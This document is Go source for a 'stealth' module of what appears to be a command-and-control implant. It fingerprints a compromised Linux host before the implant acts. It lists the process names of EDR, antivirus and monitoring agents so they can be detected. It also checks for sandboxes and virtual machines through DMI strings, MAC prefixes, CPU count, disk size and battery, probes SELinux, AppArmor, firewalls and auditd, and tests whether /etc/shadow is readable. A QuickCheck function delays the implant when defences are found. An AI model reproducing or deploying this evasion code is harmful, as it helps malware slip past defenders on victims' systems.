package stealth

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"github.com/natx6/ananse/src/c2/implant/shell"
)

// knownEDR lists common Linux EDR and AV process substrings.
var knownEDR = []string{
	"crowdstrike", "falcon_sensor", "csagent", "csfalcon",
	"sentinelone", "s1agent",
	"carbonblack", "cbsensor",
	"cylance", "cyprotect",
	"symantec", "sep",
	"mcafee", "mfetp",
	"trendmicro", "dsagent",
	"sophos", "sophosagent",
	"osqueryd", "osqueryi",
	"wazuh", "ossec-agent",
	"tripwire", "aide",
	"snort", "suricata",
	"yara",
	"zeek",
	"falcon-sensor",
	"microsoftdefender", "defender",
	"kaspersky", "kav",
	"ekrn",
	"bitdefender", "bdagent",
	"checkpoint", "cpagent",
	"paloaltonetworks", "traps",
	"rkhunter", "chkrootkit",
	"lynis",
}

var knownSandbox = []string{
	"vmtoolsd", "vboxguest", "vboxservice",
	"xenserver", "xentools",
	"qemu-ga", "qemu-guest-agent",
}

func phase1(p *beacon.TargetProfile) {
	if b, _ := os.ReadFile("/proc/sys/kernel/ostype"); len(b) > 0 {
		p.OS = strings.TrimSpace(string(b))
	}
	if b, _ := os.ReadFile("/proc/sys/kernel/osrelease"); len(b) > 0 {
		p.Kernel = strings.TrimSpace(string(b))
	}
	if b, _ := os.ReadFile("/proc/sys/kernel/hostname"); len(b) > 0 {
		p.Hostname = strings.TrimSpace(string(b))
	}

	out, _ := shell.Run("grep -E '^ID=' /etc/os-release 2>/dev/null | head -1 | cut -d= -f2", 5e9)
	p.Platform = strings.Trim(strings.TrimSpace(out), `"'`)
	out, _ = shell.Run("grep -E '^VERSION_ID=' /etc/os-release 2>/dev/null | head -1 | cut -d= -f2", 5e9)
	p.PlatformVersion = strings.Trim(strings.TrimSpace(out), `"'`)
	if p.Platform == "" {
		p.Platform = runtime.GOOS
	}

	p.CPUArch = runtime.GOARCH

	if b, _ := os.ReadFile("/proc/meminfo"); len(b) > 0 {
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "MemTotal:") {
				var kb int64
				fmt.Sscanf(line, "MemTotal: %d kB", &kb)
				p.TotalMemory = kb * 1024
			}
			if strings.HasPrefix(line, "MemFree:") {
				var kb int64
				fmt.Sscanf(line, "MemFree: %d kB", &kb)
				p.FreeMemory = kb * 1024
			}
		}
	}

	if s := os.Getenv("SHELL"); s != "" {
		p.Shell = s
	} else {
		out, _ = shell.Run("echo $SHELL", 3e9)
		p.Shell = strings.TrimSpace(out)
	}

	out, _ = shell.Run("sudo -V 2>/dev/null | head -1", 5e9)
	if out != "" {
		p.Sudo = true
		parts := strings.Fields(out)
		for i, part := range parts {
			if part == "version" && i+1 < len(parts) {
				p.SudoVersion = strings.TrimRight(parts[i+1], ")")
				break
			}
		}
	}

	if b, _ := os.ReadFile("/proc/uptime"); len(b) > 0 {
		var secs float64
		fmt.Sscanf(string(b), "%f", &secs)
		p.Uptime = int64(secs)
	}

	envIndicators := []struct {
		key, val string
		hint     string
	}{
		{"CONTAINER", "", "container env"},
		{"KUBERNETES_SERVICE_HOST", "", "kubernetes"},
		{"DOCKER_HOST", "", "docker"},
		{"container", "docker", "docker"},
		{"container", "lxc", "lxc"},
		{"HOSTNAME", "", "non-standard hostname"},
		{"CI", "true", "ci environment"},
		{"JENKINS_HOME", "", "jenkins"},
		{"GITLAB_CI", "true", "gitlab ci"},
	}
	for _, ind := range envIndicators {
		v := os.Getenv(ind.key)
		if ind.val != "" && v == ind.val {
			p.Hints = append(p.Hints, ind.hint)
		} else if ind.val == "" && v != "" {
			p.Hints = append(p.Hints, ind.hint)
		}
	}

	if b, _ := os.ReadFile("/proc/1/cgroup"); len(b) > 0 {
		content := string(b)
		if strings.Contains(content, "docker") {
			p.Hints = append(p.Hints, "docker container (cgroup)")
		}
		if strings.Contains(content, "kubepods") {
			p.Hints = append(p.Hints, "kubernetes pod (cgroup)")
		}
	}
}

func phase2(p *beacon.TargetProfile) {
	if b, _ := os.ReadFile("/etc/selinux/config"); len(b) > 0 {
		if strings.Contains(string(b), "SELINUX=enforcing") {
			p.SELinux = true
			p.Hints = append(p.Hints, "selinux enforcing")
		} else if strings.Contains(string(b), "SELINUX=permissive") {
			p.Hints = append(p.Hints, "selinux permissive")
		}
	}
	out, _ := shell.Run("getenforce 2>/dev/null", 3e9)
	if strings.Contains(out, "Enforcing") {
		p.SELinux = true
	}

	out, _ = shell.Run("aa-status 2>/dev/null | head -5", 5e9)
	if strings.Contains(out, "enabled") || strings.Contains(out, "profiles") {
		p.AppArmor = true
		p.Hints = append(p.Hints, "apparmor enabled")
	} else if _, err := os.Stat("/sys/kernel/security/apparmor"); err == nil {
		p.AppArmor = true
		p.Hints = append(p.Hints, "apparmor present")
	}

	if out, _ = shell.Run("ufw status 2>/dev/null | head -1", 3e9); out != "" {
		p.Firewall = "ufw"
	} else if out, _ = shell.Run("firewall-cmd --state 2>/dev/null", 3e9); out != "" {
		p.Firewall = "firewalld"
	} else if out, _ = shell.Run("iptables -L -n 2>/dev/null | head -5", 5e9); len(out) > 50 {
		p.Firewall = "iptables"
	} else {
		p.Firewall = "none"
	}

	if _, err := os.Stat("/sbin/auditd"); err == nil {
		p.Hints = append(p.Hints, "auditd installed")
	}
	if b, _ := os.ReadFile("/proc/sys/kernel/audit_enabled"); len(b) > 0 {
		if strings.TrimSpace(string(b)) == "1" {
			p.Hints = append(p.Hints, "auditd active")
		}
	}

	pidMap := make(map[int]string)
	pids := listProcesses()
	for _, proc := range pids {
		lower := strings.ToLower(proc.cmdline)
		for _, edr := range knownEDR {
			if strings.Contains(lower, edr) {
				p.HasAgent = true
				p.AgentPids = append(p.AgentPids, proc.pid)
				p.Hints = append(p.Hints, fmt.Sprintf("EDR process: %s (pid %d)", edr, proc.pid))
			}
		}
		for _, sandbox := range knownSandbox {
			if strings.Contains(lower, sandbox) {
				pidMap[proc.pid] = sandbox
				p.Hints = append(p.Hints, fmt.Sprintf("sandbox process: %s (pid %d)", sandbox, proc.pid))
			}
		}
	}
	_ = pidMap

	if b, _ := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); len(b) > 0 {
		scope := strings.TrimSpace(string(b))
		if scope == "0" {
			p.Hints = append(p.Hints, "ptrace unrestricted (yama=0)")
		} else if scope == "1" {
			p.Hints = append(p.Hints, "ptrace restricted (yama=1)")
		} else if scope != "" {
			p.Hints = append(p.Hints, fmt.Sprintf("ptrace scope=%s", scope))
		}
	}

	if b, _ := os.ReadFile("/sys/kernel/security/lockdown"); len(b) > 0 {
		if strings.Contains(string(b), "integrity") || strings.Contains(string(b), "confidentiality") {
			p.Hints = append(p.Hints, "kernel lockdown active")
		}
	}
}

type procInfo struct {
	pid     int
	cmdline string
}

func listProcesses() []procInfo {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}
	var procs []procInfo
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := 0
		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil || pid == 0 {
			continue
		}
		cmdline, _ := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline"))
		cmd := strings.ReplaceAll(string(cmdline), "\x00", " ")
		procs = append(procs, procInfo{pid: pid, cmdline: cmd})
	}
	return procs
}

func phase3(p *beacon.TargetProfile) {
	if ld := os.Getenv("LD_PRELOAD"); ld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("LD_PRELOAD=%s", ld))
	}
	if ld := os.Getenv("LD_LIBRARY_PATH"); ld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("LD_LIBRARY_PATH=%s", ld))
	}

	out, _ := shell.Run("ps aux 2>/dev/null | head -5", 5e9)
	if strings.Contains(out, "root") && strings.Contains(out, "ps") {
		p.Hints = append(p.Hints, "cross-user process visibility")
	}

	if b, _ := os.ReadFile("/proc/sys/fs/inotify/max_user_watches"); len(b) > 0 {
		maxWatches := strings.TrimSpace(string(b))
		if maxWatches != "" && maxWatches != "0" {
			p.Hints = append(p.Hints, fmt.Sprintf("inotify watches: %s", maxWatches))
		}
	}

	if b, _ := os.ReadFile("/etc/shadow"); len(b) > 0 {
		p.Hints = append(p.Hints, "shadow readable — high privilege")
	}

	if b, _ := os.ReadFile("/proc/modules"); len(b) > 0 {
		modules := string(b)
		monModules := []string{"audit", "kprobe", "systemtap", "kvm", "virtualbox"}
		for _, m := range monModules {
			if strings.Contains(modules, m) {
				p.Hints = append(p.Hints, fmt.Sprintf("kernel module: %s", m))
			}
		}
	}

	if b, _ := os.ReadFile("/proc/self/status"); len(b) > 0 {
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "TracerPid:") {
				tpid := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
				if tpid != "0" {
					p.Hints = append(p.Hints, fmt.Sprintf("tracer pid: %s", tpid))
				}
				break
			}
		}
	}
}

// phase4 detects VM and sandbox environments.
func phase4(p *beacon.TargetProfile) {
	// DMI product name check
	if b, _ := os.ReadFile("/sys/class/dmi/id/product_name"); len(b) > 0 {
		name := strings.ToLower(strings.TrimSpace(string(b)))
		vmVendors := map[string]string{
			"virtualbox":               "VirtualBox",
			"vmware":                   "VMware",
			"vmware virtual platform":  "VMware",
			"kvm":                      "KVM",
			"qemu":                     "QEMU",
			"standard pc":              "QEMU",
			"bochs":                    "Bochs",
			"parallels":                "Parallels",
			"prl":                      "Parallels",
			"xen":                      "Xen",
		}
		for substr, vendor := range vmVendors {
			if strings.Contains(name, substr) {
				p.IsVM = true
				p.VMVendor = vendor
				break
			}
		}
	}

	// MAC vendor check on primary interface
	var bMac []byte
	if bMac, _ = os.ReadFile("/sys/class/net/eth0/address"); len(bMac) == 0 {
		if bMac, _ = os.ReadFile("/sys/class/net/enp0s3/address"); len(bMac) == 0 {
			if bMac, _ = os.ReadFile("/sys/class/net/ens33/address"); len(bMac) == 0 {
				entries, _ := os.ReadDir("/sys/class/net")
				for _, e := range entries {
					if e.Name() == "lo" {
						continue
					}
					bMac, _ = os.ReadFile("/sys/class/net/" + e.Name() + "/address")
					if len(bMac) > 0 {
						break
					}
				}
			}
		}
	}
	if len(bMac) > 0 {
		mac := strings.ToLower(strings.TrimSpace(string(bMac)))
		macPrefixes := map[string]string{
			"08:00:27": "VirtualBox",
			"00:50:56": "VMware",
			"00:0c:29": "VMware",
			"00:05:69": "VMware",
			"00:1c:42": "Parallels",
			"00:15:5d": "Hyper-V",
			"00:03:ff": "Microsoft Hyper-V",
			"00:1c:14": "VMware",
		}
		for prefix, vendor := range macPrefixes {
			if strings.HasPrefix(mac, prefix) {
				if !p.IsVM {
					p.IsVM = true
					p.VMVendor = vendor
				}
				break
			}
		}
	}

	// CPU count
	if b, _ := os.ReadFile("/proc/cpuinfo"); len(b) > 0 {
		count := 0
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "processor") {
				count++
			}
		}
		p.CPUCount = count
		if count < 2 {
			p.IsSandbox = true
			p.Hints = append(p.Hints, fmt.Sprintf("low cpu count: %d", count))
		}
	}

	// Disk size
	if b, _ := os.ReadFile("/proc/partitions"); len(b) > 0 {
		for _, line := range strings.Split(string(b), "\n") {
			fields := strings.Fields(line)
			if len(fields) == 4 && (fields[3] == "sda" || fields[3] == "nvme0n1" || fields[3] == "vda") {
				var blocks int64
				fmt.Sscanf(fields[2], "%d", &blocks)
				gb := blocks / 1024 / 1024 * 1 // blocks are 1KB on Linux
				p.DiskSizeGB = gb
				if gb < 100 {
					p.Hints = append(p.Hints, fmt.Sprintf("small disk: %dGB", gb))
				}
				break
			}
		}
	}

	// Battery check
	p.HasBattery = true
	if b, _ := os.ReadFile("/sys/class/power_supply/BAT0/type"); len(b) == 0 {
		if b, _ = os.ReadFile("/sys/class/power_supply/BAT1/type"); len(b) == 0 {
			p.HasBattery = false
		}
	}
	if !p.HasBattery {
		entries, _ := os.ReadDir("/sys/class/power_supply")
		for _, e := range entries {
			if strings.HasPrefix(e.Name(), "BAT") {
				p.HasBattery = true
				break
			}
		}
	}
	if !p.HasBattery && !p.IsVM {
		// Desktops also lack batteries, but combined with other indicators it's suggestive
		p.Hints = append(p.Hints, "no battery detected")
	}

	// Additional sandbox indicators
	if b, _ := os.ReadFile("/proc/self/status"); len(b) > 0 {
		if strings.Contains(string(b), "VmLib") {
			for _, line := range strings.Split(string(b), "\n") {
				if strings.HasPrefix(line, "VmLib") {
					var size int64
					fmt.Sscanf(line, "VmLib: %d kB", &size)
					if size < 500 {
						p.Hints = append(p.Hints, "low library memory — possible sandbox")
					}
					break
				}
			}
		}
	}
}

func QuickCheck() (threatLevel string, initialDelay time.Duration) {
	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		return "medium", 90 * time.Second
	}

	if b, _ := os.ReadFile("/proc/1/cgroup"); len(b) > 0 {
		content := string(b)
		if strings.Contains(content, "docker") || strings.Contains(content, "kubepods") {
			return "medium", 90 * time.Second
		}
	}

	entries, _ := os.ReadDir("/proc")
	edrCount := 0
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := 0
		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil || pid == 0 {
			continue
		}
		cmdline, _ := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline"))
		cmd := strings.ToLower(strings.ReplaceAll(string(cmdline), "\x00", " "))
		for _, edr := range knownEDR {
			if strings.Contains(cmd, edr) {
				edrCount++
				if edrCount >= 2 {
					return "high", 120 * time.Second
				}
			}
		}
	}

	return "low", 0
}
